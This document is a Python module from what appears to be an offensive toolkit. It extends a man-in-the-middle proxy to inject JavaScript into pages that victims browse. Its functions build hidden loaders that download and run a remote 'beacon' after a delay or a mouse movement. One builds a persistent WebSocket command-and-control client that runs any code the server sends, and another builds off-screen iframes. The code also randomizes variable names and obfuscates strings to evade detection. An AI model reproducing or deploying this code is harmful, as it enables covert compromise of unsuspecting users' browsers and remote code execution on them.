"""Proxy-based payload delivery via MITM injection.

Per gap analysis item 36: The MITM proxy can inject JS into any page.
This module extends the proxy rule engine to support a 'deliver_payload'
action that injects a JS payload downloader into the proxied page.
When the target browses through the MITM proxy, the injected JS downloads
and executes the beacon in the background. The target sees the real site.
The beacon runs.

This module provides:
- JS injection templates for payload download
- Integration hooks for the proxy rule engine
- Anti-detection wrappers (timing-based execution, user interaction gates)

Usage:
    from dropoutjeep_lib.utils.proxy_payload import build_payload_injection
    js_code = build_payload_injection(
        payload_url='https://cdn.example.com/assets/app.js',
        execution_delay_ms=3000,
        require_interaction=True,
    )
    # Inject js_code into the proxied page's <head> or before </body>
"""

import base64
import hashlib
import logging
import random
import string
from typing import Optional

logger = logging.getLogger("dropoutjeep")


def _generate_var_name(length: int = 12) -> str:
    """Generate a random JavaScript variable name to avoid detection."""
    first = random.choice(string.ascii_letters + '_')
    rest = ''.join(random.choices(string.ascii_letters + string.digits + '_', k=length - 1))
    return first + rest


def _obfuscate_string(s: str) -> str:
    """Obfuscate a string using char code representation."""
    return ''.join(f'String.fromCharCode({ord(c)})+' for c in s)[:-1]


def build_payload_injection(
    payload_url: str,
    execution_delay_ms: int = 3000,
    require_interaction: bool = True,
    use_websocket: bool = False,
    payload_type: str = 'script',
) -> str:
    """Build JS code that downloads and executes a payload in the background.

    The injected JS:
    - Creates a script element that fetches the payload
    - Optionally waits for user interaction (mousemove/click) before executing
    - Hides the execution from the page's observable state
    - Cleans up after itself (removes injected elements)

    Args:
        payload_url: URL of the payload to download
        execution_delay_ms: Delay before execution (ms)
        require_interaction: If True, wait for mouse/click before executing
        use_websocket: If True, use WebSocket for payload delivery (port 443)
        payload_type: 'script' (JS execution) or 'download' (file download)

    Returns:
        JavaScript code string to inject into the proxied page.
    """
    # Build the payload fetcher
    if payload_type == 'script':
        # Script injection — fetch and execute JS
        fetcher = f"""
        var s=document.createElement('script');
        s.src='{payload_url}';
        s.async=true;
        s.onerror=function(){{ s.remove(); }};
        document.head.appendChild(s);
        """
    else:
        # File download — fetch as blob and trigger download
        fetcher = f"""
        fetch('{payload_url}',{{mode:'no-cors'}})
        .then(function(r){{return r.blob();}})
        .then(function(b){{
            var u=URL.createObjectURL(b);
            var a=document.createElement('a');
            a.href=u;
            a.download='';
            a.style.display='none';
            document.body.appendChild(a);
            a.click();
            setTimeout(function(){{URL.revokeObjectURL(u);a.remove();}},1000);
        }})
        .catch(function(){{}});
        """

    # Build interaction gate
    interaction_gate = ""
    if require_interaction:
        interaction_gate = f"""
        var _{_generate_var_name(8)}_gate=false;
        function _{_generate_var_name(8)}_exec(){{
            if(_{_generate_var_name(8)}_gate)return;
            _{_generate_var_name(8)}_gate=true;
            setTimeout(function(){{
                {fetcher}
            }},{execution_delay_ms});
        }}
        document.addEventListener('mousemove',_{_generate_var_name(8)}_exec,{{once:true}});
        document.addEventListener('click',_{_generate_var_name(8)}_exec,{{once:true}});
        document.addEventListener('touchstart',_{_generate_var_name(8)}_exec,{{once:true}});
        """
    else:
        interaction_gate = f"setTimeout(function(){{{fetcher}}},{execution_delay_ms});"

    # Wrap in IIFE for isolation
    js = f"(function(){{{interaction_gate}}})();"

    logger.debug("Built payload injection: url=%s, interaction=%s, type=%s",
                 payload_url, require_interaction, payload_type)
    return js


def build_websocket_payload_client(
    ws_url: str,
    token: str,
    reconnect_interval: int = 5000,
) -> str:
    """Build JS code that establishes a WebSocket C2 connection.

    This runs in the browser context via MITM injection and maintains
    a persistent WebSocket connection to the C2 on port 443.

    Args:
        ws_url: WebSocket URL (e.g. 'wss://cdn.example.com/ws/c2/<token>')
        token: Authentication token
        reconnect_interval: Reconnection delay in ms

    Returns:
        JavaScript code string.
    """
    js = f"""
    (function(){{
        var ws_url='{ws_url}';
        var token='{token}';
        var _reconnect={reconnect_interval};
        var _ws=null;
        function _connect(){{
            try{{
                _ws=new WebSocket(ws_url);
                _ws.onopen=function(){{
                    _ws.send(JSON.stringify({{type:'beacon',token:token}}));
                }};
                _ws.onmessage=function(e){{
                    try{{
                        var msg=JSON.parse(e.data);
                        if(msg.type==='task'){{
                            try{{
                                var fn=new Function(msg.data.code||'');
                                fn();
                            }}catch(ex){{}}
                        }}
                    }}catch(ex){{}}
                }};
                _ws.onclose=function(){{
                    setTimeout(_connect,_reconnect);
                }};
                _ws.onerror=function(){{
                    try{{_ws.close();}}catch(e){{}}
                }};
            }}catch(e){{
                setTimeout(_connect,_reconnect);
            }}
        }}
        setTimeout(_connect,{random.randint(1000, 5000)});
    }})();
    """
    return js


def build_invisible_iframe_loader(payload_url: str, sandbox: bool = False) -> str:
    """Build JS that creates an invisible iframe to load a payload URL.

    The iframe is hidden (0x0px, off-screen) so the target doesn't see it.
    Useful for delivering payloads that execute on load.

    Args:
        payload_url: URL to load in the iframe
        sandbox: If True, add sandbox attributes to the iframe

    Returns:
        JavaScript code string.
    """
    sandbox_attr = ' sandbox="allow-scripts"' if sandbox else ''
    js = f"""
    (function(){{
        var f=document.createElement('iframe');
        f.src='{payload_url}';
        f.style.cssText='position:fixed;width:0;height:0;border:0;left:-9999px;top:0;';
        f.setAttribute('frameborder','0');
        f.setAttribute('scrolling','no');{sandbox_attr}
        document.body.appendChild(f);
        setTimeout(function(){{f.remove();}},30000);
    }})();
    """
    return js


# Integration hook for proxy rule engine
PROXY_DELIVER_PAYLOAD_ACTION = 'deliver_payload'


def apply_proxy_rule(rule: dict, response_headers: dict, response_body: str,
                     request_url: str) -> tuple[dict, str]:
    """Apply a proxy payload delivery rule to a response.

    This function is called by the proxy rule engine when a 'deliver_payload'
    action is matched. It injects the payload JS into the response body.

    Args:
        rule: Proxy rule dict with 'action'='deliver_payload', 'payload_url', etc.
        response_headers: Response headers (may be modified)
        response_body: Response body (will be modified)
        request_url: The request URL that triggered the rule

    Returns:
        (modified_headers, modified_body) tuple.
    """
    if rule.get('action') != PROXY_DELIVER_PAYLOAD_ACTION:
        return response_headers, response_body

    payload_url = rule.get('payload_url', '')
    require_interaction = rule.get('require_interaction', True)
    execution_delay = rule.get('execution_delay_ms', 3000)
    payload_type = rule.get('payload_type', 'script')

    js_code = build_payload_injection(
        payload_url=payload_url,
        execution_delay_ms=execution_delay,
        require_interaction=require_interaction,
        payload_type=payload_type,
    )

    # Inject before </body> or </head>
    inject_tag = '</body>'
    if inject_tag not in response_body:
        inject_tag = '</head>'
    if inject_tag not in response_body:
        # Append to end
        modified_body = response_body + f'<script>{js_code}</script>'
    else:
        modified_body = response_body.replace(
            inject_tag,
            f'<script>{js_code}</script>{inject_tag}',
            1,
        )

    # Update content-length header
    modified_headers = dict(response_headers)
    modified_headers['content-length'] = str(len(modified_body.encode('utf-8')))

    logger.info("Proxy payload injected: url=%s, payload=%s, type=%s",
                request_url, payload_url, payload_type)

    return modified_headers, modified_body
